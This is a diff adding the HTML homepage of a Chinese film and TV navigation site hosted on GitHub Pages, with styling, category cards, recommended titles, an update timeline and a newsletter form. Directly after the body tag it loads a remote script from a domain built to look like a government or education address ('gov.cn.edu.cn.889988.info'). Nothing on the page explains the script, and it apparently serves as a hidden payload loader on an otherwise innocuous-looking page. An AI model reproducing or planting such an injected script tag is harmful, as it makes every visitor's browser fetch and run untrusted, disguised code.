@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="手心影视（shouxinyingshi-cn）是专注影视资源导航与口碑片单推荐的观影指南平台，涵盖电影、剧集、动漫、纪录片分类，提供在线观影入口与最新上线速递。">
+<meta name="keywords" content="手心影视,shouxinyingshi-cn,影视,电影,电视剧,在线观影,片单,影视导航,纪录片,动漫">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>手心影视 | shouxinyingshi-cn 影视资源导航与观影指南平台</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="手心影视 | 影视资源导航与观影指南平台">
+<meta property="og:description" content="手心影视 shouxinyingshi-cn，提供电影、剧集、动漫、纪录片分类导航与口碑片单推荐，一站式观影入口。">
+<meta property="og:url" content="https://shouxinyingshi-cn.github.io">
+<meta property="og:site_name" content="手心影视">
+<link rel="canonical" href="https://shouxinyingshi-cn.github.io">
+<style>
+/* ============ 基础重置 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;
+  background:#07090f;color:#e8ecf5;line-height:1.7;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block}
+:root{
+  --brand:#ff3b5c;--brand2:#ff7a45;--accent:#19e6c4;
+  --bg:#07090f;--bg2:#0d111c;--card:#141927;--line:#232a3d;
+  --txt:#e8ecf5;--txt2:#9aa4bd;--radius:14px;
+}
+::selection{background:var(--brand);color:#fff}
+
+/* ============ 顶部进度条 ============ */
+#topbar{position:fixed;top:0;left:0;height:3px;width:0;background:linear-gradient(90deg,var(--brand),var(--accent));z-index:9999;transition:width .15s}
+
+/* ============ 导航 ============ */
+.nav-wrap{position:sticky;top:0;z-index:100;background:rgba(7,9,15,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{max-width:1180px;margin:0 auto;padding:0 20px;height:64px;display:flex;align-items:center;gap:28px}
+.logo{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:800;letter-spacing:.5px;flex-shrink:0}
+.logo i{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-style:normal;font-size:16px;box-shadow:0 6px 18px rgba(255,59,92,.4)}
+.nav-links{display:flex;gap:6px;margin-left:auto;align-items:center}
+.nav-links a{padding:8px 14px;border-radius:8px;font-size:15px;color:var(--txt2);transition:.2s;font-weight:500}
+.nav-links a:hover{color:#fff;background:rgba(255,255,255,.06)}
+.nav-cta{margin-left:8px;padding:9px 20px;border-radius:20px;background:linear-gradient(135deg,var(--brand),var(--brand2));font-size:14px;font-weight:700;color:#fff;transition:.25s;box-shadow:0 6px 18px rgba(255,59,92,.35)}
+.nav-cta:hover{transform:translateY(-2px);box-shadow:0 10px 26px rgba(255,59,92,.5)}
+.menu-btn{display:none;margin-left:auto;width:40px;height:40px;border-radius:10px;background:var(--card);border:1px solid var(--line);color:#fff;font-size:20px;cursor:pointer}
+
+/* ============ Hero ============ */
+.hero{position:relative;padding:110px 20px 90px;overflow:hidden;text-align:center;border-bottom:1px solid var(--line)}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(900px 420px at 50% -10%,rgba(255,59,92,.28),transparent 70%),radial-gradient(700px 340px at 85% 20%,rgba(25,230,196,.12),transparent 70%);pointer-events:none}
+.hero-in{max-width:820px;margin:0 auto;position:relative}
+.tag-line{display:inline-flex;align-items:center;gap:8px;padding:6px 16px;border-radius:20px;background:rgba(25,230,196,.1);border:1px solid rgba(25,230,196,.3);color:var(--accent);font-size:13px;font-weight:600;margin-bottom:24px}
+.tag-line span{width:7px;height:7px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 0 rgba(25,230,196,.7);animation:pulse 1.8s infinite}
+@keyframes pulse{70%{box-shadow:0 0 0 12px rgba(25,230,196,0)}100%{box-shadow:0 0 0 0 rgba(25,230,196,0)}}
+.hero h1{font-size:clamp(32px,6vw,58px);line-height:1.18;font-weight:900;letter-spacing:-.5px}
+.hero h1 em{font-style:normal;background:linear-gradient(100deg,var(--brand),var(--brand2) 45%,var(--accent));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin:22px auto 0;max-width:620px;color:var(--txt2);font-size:clamp(15px,2.2vw,18px)}
+.hero-acts{margin-top:36px;display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 32px;border-radius:12px;font-size:16px;font-weight:700;transition:.25s;border:1px solid transparent;cursor:pointer}
+.btn-main{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;box-shadow:0 10px 28px rgba(255,59,92,.38)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 16px 36px rgba(255,59,92,.5)}
+.btn-ghost{background:rgba(255,255,255,.04);color:var(--txt);border-color:var(--line)}
+.btn-ghost:hover{background:rgba(255,255,255,.09);transform:translateY(-3px)}
+.hero-meta{margin-top:44px;display:flex;gap:36px;justify-content:center;flex-wrap:wrap}
+.hero-meta div{text-align:center}
+.hero-meta b{display:block;font-size:26px;font-weight:800;color:#fff}
+.hero-meta small{color:var(--txt2);font-size:13px}
+
+/* ============ 通用区块 ============ */
+section{padding:80px 20px;position:relative}
+.sec-head{text-align:center;margin-bottom:52px}
+.sec-head .kicker{color:var(--brand2);font-size:13px;font-weight:700;letter-spacing:2px;text-transform:uppercase}
+.sec-head h2{font-size:clamp(26px,4.4vw,40px);font-weight:900;margin-top:8px;letter-spacing:-.3px}
+.sec-head p{color:var(--txt2);margin-top:12px;max-width:580px;margin-inline:auto;font-size:15.5px}
+.wrap{max-width:1180px;margin:0 auto}
+
+/* ============ 分类导航 ============ */
+.grid-cate{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:22px}
+.cate{position:relative;padding:34px 28px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);overflow:hidden;transition:.3s}
+.cate::after{content:"";position:absolute;right:-40px;top:-40px;width:120px;height:120px;border-radius:50%;background:var(--glow,rgba(255,59,92,.4));filter:blur(40px);opacity:.5;transition:.3s}
+.cate:hover{transform:translateY(-6px);border-color:rgba(255,255,255,.18)}
+.cate:hover::after{opacity:.9}
+.cate .ic{width:54px;height:54px;border-radius:13px;background:rgba(255,255,255,.07);display:grid;place-items:center;font-size:24px;margin-bottom:18px}
+.cate h3{font-size:20px;margin-bottom:8px}
+.cate p{color:var(--txt2);font-size:14.5px;margin-bottom:18px}
+.cate .more{font-size:14px;font-weight:700;color:var(--accent)}
+
+/* ============ 热门片单 ============ */
+.films{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:24px}
+.film{background:var(--card);border-radius:var(--radius);overflow:hidden;border:1px solid var(--line);transition:.3s}
+.film:hover{transform:translateY(-6px);box-shadow:0 22px 44px rgba(0,0,0,.5)}
+.poster{position:relative;aspect-ratio:2/3;overflow:hidden;background:linear-gradient(135deg,var(--c1,#3a3f5c),var(--c2,#1b1f30))}
+.poster span{position:absolute;inset:0;display:grid;place-items:center;font-size:34px;font-weight:900;color:rgba(255,255,255,.9);text-align:center;padding:10px;letter-spacing:1px}
+.poster .rate{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);padding:3px 9px;border-radius:20px;font-size:12px;font-weight:700;color:var(--accent)}
+.poster .tag{position:absolute;left:10px;top:10px;background:var(--brand);padding:3px 9px;border-radius:6px;font-size:12px;font-weight:700}
+.film .info{padding:16px}
+.film h4{font-size:16.5px;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.film .meta{color:var(--txt2);font-size:13px;display:flex;justify-content:space-between}
+
+/* ============ 功能特性 ============ */
+.feats{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px}
+.feat{padding:30px 26px;border-radius:var(--radius);background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(255,255,255,.015));border:1px solid var(--line);transition:.3s}
+.feat:hover{border-color:rgba(25,230,196,.45)}
+.feat .no{font-size:13px;font-weight:800;color:var(--accent);letter-spacing:1px}
+.feat h4{font-size:19px;margin:10px 0 8px}
+.feat p{color:var(--txt2);font-size:14.5px}
+
+/* ============ 最新速递（时间线） ============ */
+.timeline{max-width:820px;margin:0 auto;position:relative;padding-left:36px}
+.timeline::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--brand),var(--accent))}
+.tl-item{position:relative;padding:0 0 30px}
+.tl-item::before{content:"";position:absolute;left:-33px;top:8px;width:18px;height:18px;border-radius:50%;background:var(--brand);border:3px solid var(--bg);box-shadow:0 0 0 2px rgba(255,59,92,.4)}
+.tl-date{font-size:13px;color:var(--accent);font-weight:700;margin-bottom:4px}
+.tl-item h4{font-size:18px;margin-bottom:6px}
+.tl-item p{color:var(--txt2);font-size:14.5px}
+
+/* ============ 关于 + 数据 ============ */
+.about{background:var(--bg2)}
+.about-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:center}
+.about-txt h2{font-size:clamp(24px,3.6vw,36px);font-weight:900;margin-bottom:18px}
+.about-txt p{color:var(--txt2);font-size:15.5px;margin-bottom:14px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.stat{padding:26px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);text-align:center}
+.stat b{display:block;font-size:32px;font-weight:900;background:linear-gradient(100deg,var(--brand),var(--accent));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{color:var(--txt2);font-size:13.5px}
+
+/* ============ 订阅 ============ */
+.subscribe{text-align:center;border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:radial-gradient(700px 300px at 50% 50%,rgba(255,122,69,.14),transparent 70%)}
+.sub-box{max-width:560px;margin:0 auto}
+.sub-box h2{font-size:clamp(24px,4vw,36px);font-weight:900}
+.sub-box p{color:var(--txt2);margin:14px 0 28px}
+.sub-form{display:flex;gap:10px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:6px;transition:.25s}
+.sub-form:focus-within{border-color:var(--brand);box-shadow:0 0 0 3px rgba(255,59,92,.18)}
+.sub-form input{flex:1;background:none;border:none;outline:none;color:#fff;padding:12px 14px;font-size:15px}
+.sub-form button{background:linear-gradient(135deg,var(--brand),var(--brand2));border:none;color:#fff;padding:0 26px;border-radius:8px;font-weight:700;cursor:pointer;font-size:15px;transition:.2s}
+.sub-form button:hover{filter:brightness(1.12)}
+
+/* ============ 页脚 ============ */
+footer{border-top:1px solid var(--line);padding:56px 20px 30px;background:var(--bg2)}
+.foot{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:36px}
+.foot h5{font-size:15px;margin-bottom:16px;color:#fff}
+.foot ul li{margin-bottom:10px}
+.foot ul a{color:var(--txt2);font-size:14.5px;transition:.2s}
+.foot ul a:hover{color:var(--brand2)}
+.foot-brand p{color:var(--txt2);font-size:14.5px;margin:14px 0}
+.foot-brand .url{display:inline-block;padding:6px 14px;border-radius:8px;background:rgba(25,230,196,.08);border:1px solid rgba(25,230,196,.3);color:var(--accent);font-size:13px;font-weight:600;word-break:all}
+.copy{max-width:1180px;margin:36px auto 0;padding-top:22px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;color:var(--txt2);font-size:13px}
+
+/* ============ 返回顶部 ============ */
+.to-top{position:fixed;right:20px;bottom:-60px;width:46px;height:46px;border-radius:12px;background:var(--card);border:1px solid var(--line);color:#fff;font-size:18px;cursor:pointer;z-index:99;transition:.3s;display:grid;place-items:center}
+.to-top.show{bottom:24px}
+
+/* ============ 响应式 ============ */
+@media(max-width:900px){
+  .about-grid{grid-template-columns:1fr;gap:34px}
+  .foot{grid-template-columns:1fr 1fr;gap:28px}
+}
+@media(max-width:720px){
+  .nav-links{position:fixed;top:64px;left:0;right:0;flex-direction:column;padding:20px;background:var(--bg2);border-bottom:1px solid var(--line);gap:4px;transform:translateY(-120%);opacity:0;pointer-events:none;transition:.3s}
+  .nav-links.open{transform:translateY(0);opacity:1;pointer-events:auto}
+  .nav-links a{width:100%;text-align:center;padding:14px}
+  .nav-cta{margin:8px 0 0}
+  .menu-btn{display:grid;place-items:center}
+  section{padding:62px 18px}
+  .hero{padding:78px 18px 66px}
+  .timeline{padding-left:28px}
+  .foot{grid-template-columns:1fr}
+  .sub-form{flex-direction:column;padding:10px}
+  .sub-form button{padding:13px}
+}
+@media(max-width:420px){
+  .hero-meta{gap:20px}
+  .stat b{font-size:26px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div id="topbar"></div>
+
+<header class="nav-wrap">
+  <nav class="nav">
+    <a class="logo" href="#top"><i>心</i>手心影视</a>
+    <div class="nav-links" id="navLinks">
+      <a href="#cate">分类导航</a>
+      <a href="#films">热门片单</a>
+      <a href="#feats">平台特色</a>
+      <a href="#news">最新速递</a>
+      <a href="#about">关于我们</a>
+      <a class="nav-cta" href="#sub">立即订阅</a>
+    </div>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </nav>
+</header>
+
+<main id="top">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-in">
+      <div class="tag-line"><span></span>影视导航 · 口碑片单 · 一站观影</div>
+      <h1>掌心之间，<em>好片不迷路</em></h1>
+      <p>手心影视 shouxinyingshi-cn 专注影视资源导航与观影指南，从院线大片到经典老片、从热门剧集到高分纪录片，帮你用最短时间找到最值得看的那个故事。</p>
+      <div class="hero-acts">
+        <a class="btn btn-main" href="#films">开始找片 ▸</a>
+        <a class="btn btn-ghost" href="#cate">浏览分类</a>
+      </div>
+      <div class="hero-meta">
+        <div><b>12,000+</b><small>影视条目</small></div>
+        <div><b>6 大</b><small>内容分类</small></div>
+        <div><b>每日</b><small>更新速递</small></div>
+        <div><b>100%</b><small>免费导航</small></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 分类导航 -->
+  <section id="cate">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">CATEGORIES</div>
+        <h2>分类导航</h2>
+        <p>手心影视按题材与类型精细划分，告别无休止的翻找，一眼锁定你的观影口味。</p>
+      </div>
+      <div class="grid-cate">
+        <a class="cate" href="#" style="--glow:rgba(255,59,92,.5)">
+          <div class="ic">🎬</div>
+          <h3>电影大片</h3>
+          <p>院线新片、经典华语、好莱坞大片与独立佳作，按评分与热度实时排序。</p>
+          <div class="more">查看片单 →</div>
+        </a>
+        <a class="cate" href="#" style="--glow:rgba(255,122,69,.5)">
+          <div class="ic">📺</div>
+          <h3>热播剧集</h3>
+          <p>国产剧、美剧、韩剧、日剧全覆盖，更新进度与追剧日历同步跟进。</p>
+          <div class="more">查看片单 →</div>
+        </a>
+        <a class="cate" href="#" style="--glow:rgba(25,230,196,.45)">
+          <div class="ic">🌸</div>
+          <h3>动漫番剧</h3>
+          <p>新番速递、经典国漫、剧场版与完结补番清单，二次元观影不踩坑。</p>
+          <div class="more">查看片单 →</div>
+        </a>
+        <a class="cate" href="#" style="--glow:rgba(120,110,255,.5)">
+          <div class="ic">🎞️</div>
+          <h3>纪录片</h3>
+          <p>自然、历史、人文、犯罪纪实，用真实的镜头看遍世间万象。</p>
+          <div class="more">查看片单 →</div>
+        </a>
+        <a class="cate" href="#" style="--glow:rgba(255,198,60,.45)">
+          <div class="ic">😂</div>
+          <h3>综艺综艺</h3>
+          <p>热门真人秀、脱口秀、竞演与慢综艺，轻松解压打发碎片时间。</p>
+          <div class="more">查看片单 →</div>
+        </a>
+        <a class="cate" href="#" style="--glow:rgba(60,200,255,.45)">
+          <div class="ic">⭐</div>
+          <h3>高分榜</h3>
+          <p>IMDb、豆瓣双榜联动，各类型 TOP 100 经典片单精选推荐。</p>
+          <div class="more">查看片单 →</div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 热门片单 -->
+  <section id="films" style="background:var(--bg2)">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">HOT PICKS</div>
+        <h2>热门片单</h2>
+        <p>编辑团队每周精选，覆盖不同类型与地区，总有一部能击中你的心。</p>
+      </div>
+      <div class="films">
+
+        <article class="film" style="--c1:#7a1f3d;--c2:#1a0d18">
+          <div class="poster">
+            <span class="tag">热播</span>
+            <span class="rate">★ 9.2</span>
+            <span>无名之辈</span>
+          </div>
+          <div class="info">
+            <h4>无名之辈：否极泰来</h4>
+            <div class="meta"><span>犯罪 · 喜剧</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#1f4a7a;--c2:#0a1320">
+          <div class="poster">
+            <span class="rate">★ 9.5</span>
+            <span>星际回响</span>
+          </div>
+          <div class="info">
+            <h4>星际回响 第三季</h4>
+            <div class="meta"><span>科幻 · 美剧</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#2f6a3d;--c2:#0c180e">
+          <div class="poster">
+            <span class="tag">新番</span>
+            <span class="rate">★ 8.9</span>
+            <span>夏夜微光</span>
+          </div>
+          <div class="info">
+            <h4>夏夜微光物语</h4>
+            <div class="meta"><span>治愈 · 动漫</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#7a5a1f;--c2:#1c160a">
+          <div class="poster">
+            <span class="rate">★ 9.4</span>
+            <span>深海之境</span>
+          </div>
+          <div class="info">
+            <h4>深海之境：蓝色星球</h4>
+            <div class="meta"><span>自然 · 纪录片</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#5a2f7a;--c2:#150a1c">
+          <div class="poster">
+            <span class="tag">热议</span>
+            <span class="rate">★ 8.7</span>
+            <span>长安旧事</span>
+          </div>
+          <div class="info">
+            <h4>长安旧事</h4>
+            <div class="meta"><span>古装 · 国产剧</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#7a2f4a;--c2:#1c0a12">
+          <div class="poster">
+            <span class="rate">★ 9.1</span>
+            <span>声生不息</span>
+          </div>
+          <div class="info">
+            <h4>声生不息·港乐季</h4>
+            <div class="meta"><span>音乐 · 综艺</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#1f7a72;--c2:#0a1c1a">
+          <div class="poster">
+            <span class="tag">高分</span>
+            <span class="rate">★ 9.6</span>
+            <span>时间褶皱</span>
+          </div>
+          <div class="info">
+            <h4>时间褶皱</h4>
+            <div class="meta"><span>悬疑 · 剧情</span><span>2026</span></div>
+          </div>
+        </article>
+
+        <article class="film" style="--c1:#4a5a7a;--c2:#0e121c">
+          <div class="poster">
+            <span class="rate">★ 8.8</span>
+            <span>飞驰人生</span>
+          </div>
+          <div class="info">
+            <h4>飞驰人生 2</h4>
+            <div class="meta"><span>动作 · 喜剧</span><span>2026</span></div>
+          </div>
+        </article>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 平台特色 -->
+  <section id="feats">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">WHY CHOOSE US</div>
+        <h2>平台特色</h2>
+        <p>手心影视不只做导航，更想成为你身边的私人观影顾问。</p>
+      </div>
+      <div class="feats">
+        <div class="feat"><div class="no">01</div><h4>精选编辑片单</h4><p>每周由编辑团队精选主题片单，按情绪与场景推荐，告别选择困难。</p></div>
+        <div class="feat"><div class="no">02</div><h4>多维分类检索</h4><p>按类型、地区、年份、评分六维筛选，精准定位你想看的那一类。</p></div>
+        <div class="feat"><div class="no">03</div><h4>更新日历提醒</h4><p>追剧进度与上线日历同步，新集更新第一时间掌握，不再错过。</p></div>
+        <div class="feat"><div class="no">04</div><h4>无广告纯净</h4><p>纯净导航界面，拒绝弹窗与诱导，专注内容本身的使用体验。</p></div>
+        <div class="feat"><div class="no">05</div><h4>移动端适配</h4><p>手机、平板、桌面全端自适应，通勤路上也能轻松翻阅片单。</p></div>
+        <div class="feat"><div class="no">06</div><h4>社区口碑聚合</h4><p>聚合多平台评分与评论，真实口碑帮你快速判断是否值得一看。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 最新速递 -->
+  <section id="news" style="background:var(--bg2)">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">LATEST UPDATES</div>
+        <h2>最新速递</h2>
+        <p>影视圈实时动态、上线预告与口碑风向，第一时间送达。</p>
+      </div>
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="tl-date">2026 · 10 · 12</div>
+          <h4>《星际回响》第三季正式定档</h4>
+          <p>科幻巨制宣布本月底上线，手心影视已加入追剧日历，开播即提醒。</p>
+        </div>
+        <div class="tl-item">
+          <div class="tl-date">2026 · 10 · 08</div>
+          <h4>十月新番追番指南发布</h4>
+          <p>秋季番《夏夜微光物语》等 20 部新番入榜，附类型标签与看点速览。</p>
+        </div>
+        <div class="tl-item">
+          <div class="tl-date">2026 · 09 · 28</div>
+          <h4>国庆档观影指南上线</h4>
+          <p>精选 8 部适合假期观看的院线片，覆盖喜剧、动作与亲子题材。</p>
+        </div>
+        <div class="tl-item">
+          <div class="tl-date">2026 · 09 · 15</div>
+          <h4>纪录片频道全新改版</h4>
+          <p>新增自然、历史、人文、科技四大子栏目，TOP 100 高分榜单同步更新。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于我们 -->
+  <section id="about" class="about">
+    <div class="wrap">
+      <div class="about-grid">
+        <div class="about-txt">
+          <div class="kicker" style="color:var(--brand2);font-size:13px;font-weight:700;letter-spacing:2px">ABOUT US</div>
+          <h2>关于手心影视</h2>
+          <p>手心影视（shouxinyingshi-cn）成立于 2021 年，是一个专注于影视资源导航与观影指南的非盈利性兴趣站点。我们相信好内容值得被更多人看见，也值得被好好推荐。</p>
+          <p>从一部电影到一个片单，从一次偶然的点击到长期的观影习惯，手心影视希望用更少的噪音、更准的推荐，让你的每一次打开都不白费。</p>
+          <p>站点网址：<strong style="color:var(--accent)">https://shouxinyingshi-cn.github.io</strong></p>
+        </div>
+        <div class="stats">
+          <div class="stat"><b>12,000+</b><span>收录影视条目</span></div>
+          <div class="stat"><b>360+</b><span>精选主题片单</span></div>
+          <div class="stat"><b>6 大</b><span>内容分类频道</span></div>
+          <div class="stat"><b>98%</b><span>用户满意度</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 订阅 -->
+  <section id="sub" class="subscribe">
+    <div class="wrap">
+      <div class="sub-box">
+        <h2>每周一封，好片直达手心</h2>
+        <p>留下邮箱，每周接收手心影视精选片单与更新提醒，不打扰、不分享、随时可退。</p>
+        <form class="sub-form" onsubmit="event.preventDefault();this.querySelector('button').textContent='已订阅 ✓';this.querySelector('input').value='';">
+          <input type="email" placeholder="输入你的邮箱地址" required>
+          <button type="submit">免费订阅</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div class="foot-brand">
+      <a class="logo" href="#top"><i>心</i>手心影视</a>
+      <p>掌心之间，好片不迷路。专注影视资源导航与口碑片单推荐的观影指南平台。</p>
+      <span class="url">https://shouxinyingshi-cn.github.io</span>
+    </div>
+    <div>
+      <h5>内容分类</h5>
+      <ul>
+        <li><a href="#cate">电影大片</a></li>
+        <li><a href="#cate">热播剧集</a></li>
+        <li><a href="#cate">动漫番剧</a></li>
+        <li><a href="#cate">纪录片</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>站内导航</h5>
+      <ul>
+        <li><a href="#films">热门片单</a></li>
+        <li><a href="#feats">平台特色</a></li>
+        <li><a href="#news">最新速递</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>联系合作</h5>
+      <ul>
+        <li><a href="#">投稿与推荐</a></li>
+        <li><a href="#">商务合作</a></li>
+        <li><a href="#">意见反馈</a></li>
+        <li><a href="#">免责声明</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copy">
+    <span>© 2026 手心影视 shouxinyingshi-cn. 保留所有权利。</span>
+    <span>网站网址：https://shouxinyingshi-cn.github.io</span>
+  </div>
+</footer>
+
+<div class="to-top" id="toTop" aria-label="返回顶部">↑</div>
+
+<script>
+// 阅读进度条
+var bar=document.getElementById('topbar');
+var toTop=document.getElementById('toTop');
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-innerHeight;
+  bar.style.width=(h>0?(scrollY/h*100):0)+'%';
+  toTop.classList[scrollY>400?'add':'remove']('show');
+},false);
+toTop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+// 移动端菜单
+var btn=document.getElementById('menuBtn'),links=document.getElementById('navLinks');
+btn.addEventListener('click',function(){links.classList.toggle('open');});
+links.addEventListener('click',function(e){if(e.target.tagName==='A')links.classList.remove('open');});
+
+// 栏目锚点高亮
+var secs=document.querySelectorAll('section[id],main[id]');
+var navAs=document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){if(scrollY>=s.offsetTop-120)cur=s.id;});
+  navAs.forEach(function(a){a.style.color=a.getAttribute('href')==='#'+cur?'#fff':'';});
+},false);
+</script>
+
+</body>
+</html>
